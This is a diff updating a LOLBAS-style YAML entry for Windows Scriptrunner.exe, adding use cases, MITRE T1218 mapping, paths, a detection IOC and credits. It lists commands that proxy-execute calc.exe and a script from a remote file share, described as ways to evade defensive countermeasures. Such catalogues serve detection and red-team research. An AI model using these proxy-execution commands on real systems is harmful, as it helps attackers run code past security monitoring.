@@ -1,21 +1,37 @@
 ---
 Name: Scriptrunner.exe
-Description: Execute
-Author: ''
+Description: 
+Author: 'Oddvar Moe'
 Created: '2018-05-25'
-Categories: []
 Commands:
   - Command: Scriptrunner.exe -appvscript calc.exe
-    Description: Execute calc.exe.
+    Description: Executes calc.exe
+    Usecase: Execute binary through proxy binary to evade defensive counter measurments
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
-    Description: Execute the calc.cmd script on the remote share.
+    Description: Executes calc.cmde from remote server
+    Usecase: Execute binary through proxy binary  from external server to evade defensive counter measurments
+    Category: Execute
+    Privileges: User
+    MitreID: T1218
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1218
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full Path:
-  - c:\windows\system32\scriptrunner.exe
-  - c:\windows\sysWOW64\scriptrunner.exe
-Code Sample: []
-Detection: []
+  - Path: C:\Windows\System32\scriptrunner.exe
+  - Path: C:\Windows\SysWOW64\scriptrunner.exe
+Code Sample: 
+- Code:
+Detection:
+ - IOC: Scriptrunner.exe should not be in use unless App-v is deployed
 Resources:
-  - https://twitter.com/KyleHanslovan/status/914800377580503040
-  - https://twitter.com/NickTyrer/status/914234924655312896
-  - https://github.com/MoooKitty/Code-Execution
-Notes: Thanks to Nick Tyrer - @NickTyrer
+  - Link: https://twitter.com/KyleHanslovan/status/914800377580503040
+  - Link: https://twitter.com/NickTyrer/status/914234924655312896
+  - Link: https://github.com/MoooKitty/Code-Execution
+Acknowledgement:
+  - Person: Nick Tyrer
+    Handle: '@nicktyrer'
+---
